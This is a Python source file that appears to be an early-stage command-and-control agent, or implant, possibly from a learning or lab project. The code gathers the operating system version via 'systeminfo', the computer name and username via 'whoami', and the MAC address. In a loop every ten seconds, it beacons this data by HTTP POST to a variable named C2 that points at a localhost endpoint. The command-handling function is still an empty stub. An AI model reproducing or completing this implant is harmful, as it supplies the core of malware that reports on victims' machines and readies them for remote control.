"""
Agent
[X] grab operating_system, computer_name, username
[] Send POST req to server
"""

import os
import re
import time
import uuid

import requests

INDEX_COMPUTER_NAME = 0
INDEX_USERNAME = 1
RE_DATA_AFTER_MULTIPLE_SPACES = r'(.*): +(.*)'
C2 = r'http://127.0.0.1:8000/api/{}/get'


def get_mac():
    return ':'.join(re.findall('..', '%012x' % uuid.getnode()))


def get_os():
    """Uses systeminfo to obtain the OS and OS Version
    Returns the concatenated string"""
    os_version = ''
    output_systeminfo = os.popen('systeminfo')
    for output in output_systeminfo.read().splitlines()[2:4]:
        info = re.match(RE_DATA_AFTER_MULTIPLE_SPACES, output)
        os_version += info.groups()[1]
        os_version += ' - '
    return os_version.rstrip(' -')


def get_computer_and_username():
    """Uses whoami to get the computer name and user name
    Returns it in a list"""
    output_whoami = os.popen('whoami')
    return output_whoami.read().strip().split('\\')


def process_response(unchecked_cmd):
    pass


def say_hello():
    post_object = {
        'operating_system': get_os(),
        'computer_name': get_computer_and_username()[INDEX_COMPUTER_NAME],
        'username': get_computer_and_username()[INDEX_USERNAME]
    }
    res = requests.post(C2.format(get_mac()), data=post_object)
    process_response(res.text)


def main():
    while True:
        time.sleep(10)
        say_hello()


if __name__ == '__main__':
    main()
